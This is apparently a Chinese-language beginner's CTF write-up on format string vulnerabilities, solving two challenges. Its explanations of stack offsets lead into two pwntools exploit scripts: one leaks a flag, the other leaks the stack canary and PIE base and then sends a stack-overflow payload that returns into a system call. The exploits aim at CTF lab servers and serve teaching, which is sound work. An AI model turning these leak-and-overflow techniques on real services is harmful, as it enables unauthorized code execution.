---
title: PWN入门-格式化字符串漏洞做题
date: 2024-01-26 23:07:36
tags: PWN
mathjax: true
---

# PWN入门-格式化字符串漏洞做题

## [HNCTF 2022 Week1]fmtstrre

函数传参前6个用寄存器rdi、rsi、rdx、rcx、r8、r9，从第七个开始压栈，所以“%7\$s”表示输出栈地址第1个位置当作字符串输出，后4个“a”用于将格式化字符串8字节对齐，看到flag只出来一半就再往前推地址。

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
elf=ELF('./attachment')
p=remote("node5.anna.nssctf.cn",28285)
p.recvuntil("Input your format string.")
fmtstr=b'%7$saaaa'
name_addr=p64(elf.sym["name"]-0x20)
payload1=flat([fmtstr,name_addr])
p.sendline(payload1)
p.interactive()
```

## [深育杯 2021]find_flag

首先前6个参数为寄存器传参，然后format数组所占空间为$\displaystyle\frac{\mathrm{0x}60-\mathrm{0x}08}{8}$字节，加起来后canary地址为第17个参数，ebp为第18个参数，return地址为第19个参数。

开了PIE保护，尝试泄漏sub_132F的返回地址，在原基址的情况下即为`call sub_132F`的下一条指令`mov eax,0`。

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
p=remote("node4.anna.nssctf.cn",28929)
payload1="%17$p-%19$p"
p.recvuntil("Hi! What's your name? ")
p.sendline(payload1)
p.recvuntil("0x")
canary1=int(p.recv(16),16)
log.success("Canary: "+str(hex(canary1)))
p.recvuntil("0x")
elf_base=int(p.recv(12),16)-0x146f
system_addr=elf_base+0x1229
ret_addr=elf_base+0x101a
stack_overflow=cyclic(0x40-0x8)
ebp_padding=cyclic(0x8)
payload2=flat([stack_overflow,canary1,ebp_padding,ret_addr,system_addr])
p.recvuntil("Anything else? ")
p.sendline(payload2)
p.interactive()
```
